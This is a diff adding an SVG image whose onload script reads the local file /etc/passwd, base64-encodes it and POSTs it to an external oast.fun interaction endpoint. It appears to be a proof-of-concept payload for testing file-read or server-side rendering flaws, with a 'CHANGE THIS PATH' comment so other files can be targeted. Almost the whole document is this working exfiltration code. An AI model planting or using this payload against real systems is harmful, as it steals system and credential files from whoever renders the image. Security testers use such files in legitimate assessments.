@@ -1,0 +1,42 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     width="400" height="200"
+     onload="loadLocalFile()">
+
+  <script type="application/ecmascript"><![CDATA[
+    async function loadLocalFile() {
+      try {
+        // CHANGE THIS PATH
+        const fileUrl = "file:///etc/passwd";
+
+        // Fetch local file
+        const response = await fetch(fileUrl);
+        const text = await response.text();
+
+        // Base64 encode
+        const base64Data = btoa(unescape(encodeURIComponent(text)));
+
+        // Send to endpoint
+        await fetch("https://biduhygiknnyfdmkcndy3ex5he3x2sc5z.oast.fun/endpoint", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            filename: fileUrl,
+            data: base64Data
+          })
+        });
+
+        console.log("File sent successfully");
+      } catch (e) {
+        console.error("Error:", e);
+      }
+    }
+  ]]></script>
+
+  <rect x="0" y="0" width="400" height="200" fill="#111"/>
+  <text x="20" y="100" fill="#0f0" font-size="14">
+    Loading local file...
+  </text>
+</svg>
